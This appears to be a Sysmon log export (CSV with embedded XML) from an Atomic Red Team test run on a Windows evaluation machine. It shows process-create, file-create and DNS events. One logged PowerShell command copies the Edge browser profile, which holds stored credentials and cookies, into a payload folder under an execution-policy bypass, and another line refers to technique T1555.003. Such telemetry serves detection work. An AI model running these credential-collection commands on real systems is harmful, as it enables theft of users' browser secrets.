cat $env:temp\T1555.003Test8.txt}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9474,,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:25.271

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE",Info,,,,,,,{fda94052-34f2-658d-3f00-000000000b00},7044,2948,,,wpad,-,1460,"
      ",-,,,,,,2023-12-28T09:37:20.7543328Z,,,Dns query (rule: DnsQuery),,1124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 23:54:25.271,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:20.7543328Z""/>
      <EventRecordID>9474</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:25.271</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f2-658d-3f00-000000000b00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">wpad</Data>
      <Data Name=""QueryStatus"">1460</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:25.271

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:18.734,,,,,,,,,11,9473,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:37:18.734

ProcessGuid: {fda94052-41ce-658d-7702-000000000b00}

ProcessId: 8452

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1kyfln14.jyx.ps1

CreationUtcTime: 2023-12-28 09:37:18.734

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41ce-658d-7702-000000000b00},7044,8452,,,,,,"
      ",-,,,,,,2023-12-28T09:37:18.7407099Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1kyfln14.jyx.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:18.734,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:18.7407099Z""/>
      <EventRecordID>9473</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:18.734</Data>
      <Data Name=""ProcessGuid"">{fda94052-41ce-658d-7702-000000000b00}</Data>
      <Data Name=""ProcessId"">8452</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1kyfln14.jyx.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:18.734</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:37:18.734

ProcessGuid: {fda94052-41ce-658d-7702-000000000b00}

ProcessId: 8452

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_1kyfln14.jyx.ps1

CreationUtcTime: 2023-12-28 09:37:18.734

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Copy-Item \""""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"""" -Destination \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge\"""" -Force -Recurse}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9472,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:18.603

ProcessGuid: {fda94052-41ce-658d-7702-000000000b00}

ProcessId: 8452

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"""" -Destination \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge\"""" -Force -Recurse}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-41ce-658d-7702-000000000b00},7044,8452,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:37:18.6048152Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:18.603,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:18.6048152Z""/>
      <EventRecordID>9472</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:18.603</Data>
      <Data Name=""ProcessGuid"">{fda94052-41ce-658d-7702-000000000b00}</Data>
      <Data Name=""ProcessId"">8452</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Copy-Item \""""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"""" -Destination \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge\"""" -Force -Recurse}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:37:18.603

ProcessGuid: {fda94052-41ce-658d-7702-000000000b00}

ProcessId: 8452

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Copy-Item \""""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\"""" -Destination \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Edge\"""" -Force -Recurse}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9471,,,,C:\Windows\system32\svchost.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:22.873

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE",Info,,,,,,,{fda94052-34f2-658d-3f00-000000000b00},7044,2948,,,wpad,-,1460,"
      ",-,,,,,,2023-12-28T09:37:18.3454857Z,,,Dns query (rule: DnsQuery),,1124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 23:54:22.873,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:18.3454857Z""/>
      <EventRecordID>9471</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:22.873</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f2-658d-3f00-000000000b00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">wpad</Data>
      <Data Name=""QueryStatus"">1460</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\system32\svchost.exe</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 23:54:22.873

ProcessGuid: {fda94052-34f2-658d-3f00-000000000b00}

ProcessId: 2948

QueryName: wpad

QueryStatus: 1460

QueryResults: -

Image: C:\Windows\system32\svchost.exe

User: NT AUTHORITY\LOCAL SERVICE</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:37:17.007,,,,,,,,,11,9470,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:37:17.007

ProcessGuid: {fda94052-41cc-658d-7502-000000000b00}

ProcessId: 5316

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_zqtcenje.ptp.ps1

CreationUtcTime: 2023-12-28 09:37:17.007

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-41cc-658d-7502-000000000b00},7044,5316,,,,,,"
      ",-,,,,,,2023-12-28T09:37:17.0205600Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_zqtcenje.ptp.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:37:17.007,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:37:17.0205600Z""/>
      <EventRecordID>9470</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:37:17.007</Data>
      <Data Name=""ProcessGuid"">{fda94052-41cc-658d-7502-000000000b00}</Data>
      <Data Name=""ProcessId"">5316</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_zqtcenje.ptp.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:37:17.007</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:37:17.007

ProcessGuid: {fda94052-41cc-658d-7502-000000000b00}

ProcessId: 5316

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_zqtcenje.ptp.ps1

CreationUtcTime: 2023-12-28 09:37:17.007

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
